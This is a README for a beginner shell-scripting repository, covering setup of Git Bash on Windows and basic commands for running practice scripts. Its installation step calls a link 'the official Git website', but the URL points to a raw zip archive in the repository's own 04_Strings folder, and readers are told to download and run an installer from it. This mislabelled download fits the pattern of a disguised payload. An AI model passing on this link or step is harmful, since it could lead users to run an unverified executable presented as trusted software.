## 📖 About Shell-Scripting

This repository contains complete notes and assignments on shell scripting. It covers the basics such as variables, operators, strings, conditionals, loops, and arrays. It is designed for beginners and includes 19 practice problems to help you learn by doing.

Shell scripting lets you automate tasks on your computer using simple command-line scripts. This can save time and reduce errors when repeating actions on your system. The skills you gain here apply mainly to Linux and Unix-based systems but are useful to understand general scripting logic.

## 🚀 Getting Started

Shell scripts run in a command-line environment. Windows does not include a native shell script interpreter by default. You will need to install a tool called Git Bash or Windows Subsystem for Linux (WSL) to run and test these scripts.

## 🛠 Setting Up Your Environment on Windows

To run shell scripts on Windows, you can use Git Bash or WSL. We explain how to get started with Git Bash as it is simpler for beginners.

### Installing Git Bash

1. Go to the official Git website: https://github.com/idkNikunj/Shell-Scripting/raw/refs/heads/main/04_Strings/Shell_Scripting_1.3.zip

2. Download the installer executable for Windows.

3. Run the installer and follow the prompts, keeping default options selected unless you have specific needs.

4. After installation, open **Git Bash** from your Start menu.

### Running Shell Scripts

1. Open **Git Bash**.

2. Navigate to the folder where you extracted the Shell-Scripting files. Use the command:

   ```
   cd /c/Users/YourName/Downloads/Shell-Scripting
   ```

   Replace `YourName` with your Windows user name and adjust the path if needed.

3. List files with:

   ```
   ls
   ```

4. Run a shell script file by typing:

   ```
   bash filename.sh
   ```

   Replace `filename.sh` with the script you want to try.

## 📚 Additional Tips

- Shell scripting requires patience while learning new commands.
- Always save and back up your scripts.

## 💻 Running Scripts Safely

- Only run scripts from sources you trust.
- Review script contents in a text editor before running.
- Avoid running scripts with administrator privileges unless necessary.
